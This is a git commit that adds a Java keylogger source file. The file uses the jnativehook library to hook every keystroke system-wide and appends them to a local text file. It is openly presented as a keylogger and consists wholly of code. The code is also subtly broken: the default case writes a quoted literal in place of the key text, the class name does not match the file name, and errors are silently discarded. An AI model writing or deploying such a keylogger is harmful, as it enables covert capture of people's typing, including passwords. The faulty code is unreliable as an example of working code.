f6a15b0313366abf7ea9342f9cd17e143cf3e020
Sensxy <70344661+Sensxy@users.noreply.github.com>
2022-05-05 13:07:30 -0600

    Create keylogger.java

---
+++ src/main/keylogger/keylogger.java
@@ -0,0 +1,72 @@
+package keylogger;
+
+import java.io.FileWriter;
+import java.io.IOException;
+
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+
+public class Keylogger implements NativeKeyListener  {
+
+	
+	
+	public static void main(String[] args) {
+		
+		try {
+			GlobalScreen.registerNativeHook();
+		} catch (NativeHookException ex) {
+			
+		}
+		
+			
+			GlobalScreen.addNativeKeyListener(new Keylogger());
+		
+		
+	}
+	
+	
+	public void nativeKeyPressed(NativeKeyEvent nke) {
+		switch (nke.getKeyCode()) {
+		case NativeKeyEvent.VC_SPACE:
+			try {
+				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
+				fw.write(" ");
+				fw.close();
+			} catch (IOException ex) {
+				
+			}
+				//System.out.println(" ");
+			break;
+		case NativeKeyEvent.VC_ENTER:
+			try {
+				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
+				fw.write("\n");
+				fw.close();
+			} catch (IOException ex) {
+				
+			}
+			break;
+		case NativeKeyEvent.VC_DOWN:
+			try {
+				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
+				fw.write("down Arrow ");
+				fw.close();
+			} catch (IOException ex) {
+				
+			}
+			break;
+		default:
+			try {
+				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
+				fw.write("NativeKeyEvent.getKeyText(nke.getKeyCode())");
+				fw.close();
+			} catch (IOException ex) {
+				
+			}
+			
+			break;
+		}
+	}
+}
